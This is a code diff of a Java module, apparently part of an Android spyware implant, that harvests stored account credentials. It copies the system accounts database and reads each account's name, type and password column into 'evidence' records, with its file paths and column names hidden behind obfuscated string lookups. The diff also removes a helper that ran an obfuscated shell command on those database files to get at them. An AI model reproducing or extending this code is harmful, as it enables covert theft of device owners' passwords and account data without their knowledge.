@@ -27,7 +27,6 @@ import com.android.networking.util.WChar;
 
 public class ModulePassword extends BaseModule {
 
-	
 	private static final String TAG = "ModulePassword"; //$NON-NLS-1$
 	private static final int ELEM_DELIMITER = 0xABADC0DE;
 	private Markup markupPassword;
@@ -67,18 +66,19 @@ public class ModulePassword extends BaseModule {
 
 	@Override
 	protected void actualGo() {
-		
+
 		RecordVisitor passwordVisitor = new RecordVisitor() {
 			EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
 			boolean needToSerialize = false;
-			
+
 			@Override
-			public void close(){
+			public void close() {
 				if (needToSerialize) {
 					markupPassword.serialize(lastPasswords);
 				}
 				evidence.close();
 			}
+
 			@Override
 			public void cursor(Cursor cursor) {
 				String jid = cursor.getString(0);
@@ -112,11 +112,11 @@ public class ModulePassword extends BaseModule {
 				}
 			}
 		};
-		
+
 		dumpAccounts(passwordVisitor);
-		
+
 	}
-	
+
 	public static void dumpAccounts(RecordVisitor visitor) {
 		// h_0=/data/system/
 		// h_1=/data/system/users/0/
@@ -126,61 +126,34 @@ public class ModulePassword extends BaseModule {
 		String file = Messages.getString("h_2");
 
 		String dbFile = "";
-		
-		File fu=new File(pathUser,file);
-		File fs=new File(pathSystem,file);
-		
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (dumpPasswordDb): fs=" + fs.exists() + " fu=" +fu.exists());
-		}
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (dumpPasswordDb) " + fs.getAbsolutePath() + " " + fs.getParent());
+
+		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(pathSystem, file);
+		if (helper == null) {
+			helper = GenericSqliteHelper.openCopy(pathUser, file);
 		}
 
-		if (fu.exists() && unprotect(fu.getParent()) && unprotect(fu.getAbsolutePath())) {
-			dbFile = fu.getAbsolutePath();
-		} else if (fs.exists() && unprotect(fs.getParent()) && unprotect(fs.getAbsolutePath())) {
-			dbFile = fs.getAbsolutePath();
-		} else {
+		if (helper == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable accounts.db");
-			}
-			return;
-		}
-
-		String localFile = Path.markup() + file;
-
-		try {
-			Utils.copy(new File(dbFile), new File(localFile));
-			GenericSqliteHelper helper = new GenericSqliteHelper(dbFile, 4);
-			
-			// h_4=accounts
-			String table = Messages.getString("h_4");
-
-			// h_5=_id
-			// h_6=name
-			// h_7=type
-			// h_8=password
-			String[] projection = { Messages.getString("h_5"), Messages.getString("h_6"), Messages.getString("h_7"),
-					Messages.getString("h_8") };
-			
-			
-			
-			helper.traverseRecords(table, projection, visitor);
-			
-		} catch (IOException e) {
-			if (Cfg.DEBUG) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (dumpPasswordDb) ERROR: " + e);
-				}
+				Check.log(TAG + " (dumpPasswordDb) ERROR: cannot open db" );
 			}
 		}
+
+		// h_4=accounts
+		String table = Messages.getString("h_4");
+
+		// h_5=_id
+		// h_6=name
+		// h_7=type
+		// h_8=password
+		String[] projection = { Messages.getString("h_5"), Messages.getString("h_6"), Messages.getString("h_7"),
+				Messages.getString("h_8") };
+
+		helper.traverseRecords(table, projection, visitor);
 
 	}
 
-
 	public static void dumpAddressBookAccounts() {
-	
+
 	}
 
 	private static String getService(String type) {
@@ -208,18 +181,6 @@ public class ModulePassword extends BaseModule {
 
 		return 0;
 
-	}
-
-	private static boolean unprotect(String path) {
-		try {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + path);
-			}
-			Runtime.getRuntime().exec(Messages.getString("h_3") + path);
-			return true;
-		} catch (IOException e) {
-			return false;
-		}
 	}
 
 	@Override
